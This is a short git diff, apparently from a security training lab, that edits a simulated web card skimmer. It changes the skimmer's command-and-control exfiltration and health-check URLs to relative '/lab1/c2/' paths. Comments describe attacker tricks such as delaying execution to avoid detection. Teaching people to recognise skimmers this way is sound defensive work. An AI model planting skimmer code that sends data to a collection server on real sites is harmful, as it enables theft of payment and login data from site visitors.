@@ -250,16 +250,10 @@
   // Attackers add a slight delay to avoid detection during page load
   setTimeout(function () {
     // Configuration - would be obfuscated in real attacks
-    // Dynamically determine C2 URL based on environment
-    const hostname = window.location.hostname
-    let exfilUrl = 'http://localhost:9002/collect' // Local development default
-    let healthUrl = 'http://localhost:9002/health' // Local development default
-
-    // Production and staging - use relative URL since C2 is proxied by nginx
-    if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
-      exfilUrl = window.location.origin + '/collect'
-      healthUrl = window.location.origin + '/health'
-    }
+    // Use relative paths for C2 URLs (works in all environments via Traefik)
+    // Traefik routes /lab1/c2/* to C2 server
+    const exfilUrl = '/lab1/c2/collect'
+    const healthUrl = '/lab1/c2/health'
 
     /**
      * Health Check - Ping C2 server on page load to ensure it's ready
@@ -273,7 +267,7 @@
           credentials: 'omit',
           cache: 'no-cache'
         })
-        
+
         if (response.ok) {
           const data = await response.json()
           console.log('[SKIMMER] ✅ C2 server is ready:', data)
